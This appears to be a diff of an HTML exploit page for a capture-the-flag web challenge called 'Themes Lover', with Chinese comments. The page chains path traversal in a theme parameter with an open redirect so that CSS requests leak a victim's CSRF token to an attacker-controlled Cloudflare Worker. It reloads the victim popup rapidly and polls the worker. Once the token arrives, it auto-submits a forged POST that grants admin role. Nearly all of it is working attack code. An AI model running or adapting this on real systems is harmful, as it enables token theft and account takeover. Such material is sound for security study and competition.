@@ -1,54 +1,128 @@
 <!doctype html>
-<meta charset="utf-8">
+<html lang="zh-Hant">
+<head>
+  <meta charset="utf-8">
+  <title>Themes Lover exploit</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
 <body>
+<pre id="log">starting...</pre>
+
 <script>
-const params = new URLSearchParams(location.search);
-const userId = params.get('uid');
-const worker = params.get('w');
-const sid = params.get('sid');
+const WORKER_BASE = "https://flat-unit-aed6.xxterenerertxx.workers.dev/";
+const TARGET_ORIGIN = "http://localhost:5000";
+const TARGET_USER_ID = "PUT-YOUR-USER-ID-HERE";
 
-function openVictim() {
-  window.open('http://localhost:5000/edit_user', '_blank');
-}
+const logEl = document.getElementById("log");
+const log = (...args) => {
+  logEl.textContent += "\n" + args.join(" ");
+  console.log(...args);
+};
 
-async function poll() {
-  for (;;) {
-    const r = await fetch(worker + '/token?id=' + encodeURIComponent(sid), {
-      cache: 'no-store',
-    });
-    const data = await r.json();
+const id = crypto.randomUUID();
+const workerHost = new URL(WORKER_BASE).host;
 
-    if (data.token && data.token.length >= 91) {
-      const f = document.createElement('form');
-      f.method = 'POST';
-      f.action = 'http://localhost:5000/edit_user';
+/*
+  重要：
+  題目模板會組成：
+    /static/css/${theme}.css
 
-      const fields = {
-        user_id: userId,
-        username: '',
-        password: '',
-        role: 'admin',
-        csrf_token: data.token,
-      };
+  所以這裡的 theme 要設成：
+    ../../switch_theme?theme=light&redirect_path=//WORKER_HOST/css/ID
 
-      for (const [k, v] of Object.entries(fields)) {
-        const i = document.createElement('input');
-        i.type = 'hidden';
-        i.name = k;
-        i.value = v;
-        f.appendChild(i);
-      }
+  最終 stylesheet request 會變成：
+    /switch_theme?theme=light&redirect_path=//WORKER_HOST/css/ID.css
+*/
+const innerTheme =
+  `../../switch_theme?theme=light&redirect_path=//${workerHost}/css/${id}`;
 
-      document.body.appendChild(f);
-      f.submit();
-      return;
+const victimUrl =
+  `${TARGET_ORIGIN}/switch_theme?theme=${encodeURIComponent(innerTheme)}&redirect_path=/edit_user`;
+
+let victimWin = null;
+let navTimer = null;
+let pollTimer = null;
+let sentFinal = false;
+
+function openOrNavigateVictim() {
+  const url = victimUrl + "#r=" + Math.random();
+
+  try {
+    if (!victimWin || victimWin.closed) {
+      victimWin = window.open(url, "victim");
+    } else {
+      victimWin.location = url;
     }
-
-    await new Promise(r => setTimeout(r, 30));
+  } catch (e) {
+    try {
+      victimWin = window.open(url, "victim");
+    } catch (_) {}
   }
 }
 
-openVictim();
-poll();
+async function getState() {
+  const r = await fetch(`${WORKER_BASE}/state/${id}?r=${Math.random()}`, {
+    cache: "no-store"
+  });
+  return await r.json();
+}
+
+function sendPrivilegeEscalation(csrfToken) {
+  if (sentFinal) return;
+  sentFinal = true;
+
+  clearInterval(navTimer);
+  clearInterval(pollTimer);
+
+  log("[+] csrf =", csrfToken);
+  log("[+] sending POST /edit_user");
+
+  const form = document.createElement("form");
+  form.method = "POST";
+  form.action = `${TARGET_ORIGIN}/edit_user`;
+  form.target = "victim";
+
+  // 這兩個空字串很重要，不要省略
+  // 不然後端可能拿 g.user['username'] 當預設值，導致驗證卡住
+  form.innerHTML = `
+    <input name="user_id" value="${TARGET_USER_ID}">
+    <input name="username" value="">
+    <input name="password" value="">
+    <input name="role" value="admin">
+    <input name="csrf_token" value="${csrfToken}">
+  `;
+
+  document.body.appendChild(form);
+  form.submit();
+
+  log("[+] submitted");
+  log("[+] 現在用你自己的帳號重新登入，然後去 /flag");
+}
+
+async function poll() {
+  try {
+    const st = await getState();
+    log(`[i] prefix=${st.prefix || ""} done=${st.done}`);
+
+    if (st.done && st.token) {
+      sendPrivilegeEscalation(st.token);
+    }
+  } catch (e) {
+    log("[!] poll error", String(e));
+  }
+}
+
+log("[*] id =", id);
+log("[*] victimUrl =", victimUrl);
+log("[*] opening popup...");
+
+openOrNavigateVictim();
+
+// 高頻率重載 popup，讓 token 一次次往前爆
+navTimer = setInterval(openOrNavigateVictim, 35);
+
+// 輪詢 Worker 狀態
+pollTimer = setInterval(poll, 120);
 </script>
 </body>
+</html>
